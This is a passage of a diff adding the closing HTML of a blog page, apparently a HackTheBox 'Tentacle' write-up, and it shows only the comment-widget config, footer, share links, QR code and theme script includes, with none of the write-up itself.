+          owner: 'LucifielHack',
+          admin: ['LucifielHack'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            <!--- 
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>footer.license</span> --->
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Lucifiel &copy; 2020 - 2023</span>
+            <span>
+                
+                Power by Lucifiel</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/06/16/Hackthebox/Hackthebox-Tentacle/&title=《Tentacle - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/06/16/Hackthebox/Hackthebox-Tentacle/&title=《Tentacle - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2021/06/16/Hackthebox/Hackthebox-Tentacle/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Tentacle - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2021/06/16/Hackthebox/Hackthebox-Tentacle/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2021/06/16/Hackthebox/Hackthebox-Tentacle/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACv0lEQVR42u3aQY7bQAwEQP//0w6QU4DE2m5yZrOH0smwZWnKBoYUydcrPt6/j7/f+fP994fj0xXauyRXGB54eHh4o6Xni3u+2fO3nl+363k+Bw8PD+82r11o8umnW5694xdXxsPDw/uvvGgjfgwebVDJwwkeHh7ez+RFlxsVEfaJOB4eHt7389qH/+QKz9+dlYYv1lrw8PDwuhz4dW/jvvH6Yn8PDw8Pb9FVz7f7WTL9XN59rw88PDy8G7yktDobwGqT6baYWwQMPDw8vGu8zfa9Ke/mjbS8qfaPwICHh4d3iNd+YbZNb8YF8p+1SKbx8PDwFrx8vGnWDNuUHtrWWvHEgIeHh3eI1xYmEkA7XpCXMAoqHh4e3lFe+6jfbtyz9n/+M31xFzw8PLxrvHzbzT89W9LNy77FpBgeHh7emjcbFEiQbam3bap9PBMPDw/vAq8tSezb/HnwmK1nVXHBw8PDC3j7guksXW6T8vYxAA8PD+97eLP2/6yFNiv4JuXjjw0wPDw8vEO82RBVvsXPyrinSh54eHh438m718RqW2ht2r0avcLDw8MredHjfdzQmo1P5aMDRUKPh4eHd4G3T38TQLu4U00yPDw8vBu8fPtuRwFONclWgwh4eHh4F3j5Ljpr588GAvapNh4eHt5tXlEYjRc3G03IA8mBxBoPDw9vwWuf39sF5eNWmzvWcQwPDw9vxJuNTOWtr3xsK0+dD4wO4OHh4a15m5JrmyhvSrTDKIeHh4d3iHej+dSGjVkJIxoCw8PDw7vAO9Xi2uDzhD45cxhI8PDw8Epeni4nKXh+5j54RP8bHh4e3jVeGwySpZwKD6umHR4eHt4P4OXtrryo0bbfkgCGh4eH9xN4eROrfT8vc7TXxMPDw7vHa8cCZol1e69V7RkPDw/vGm/zqJ//EG3bbD9AgIeHh3eB9wumvCvw4wBdFwAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+
+</body>
+</html>
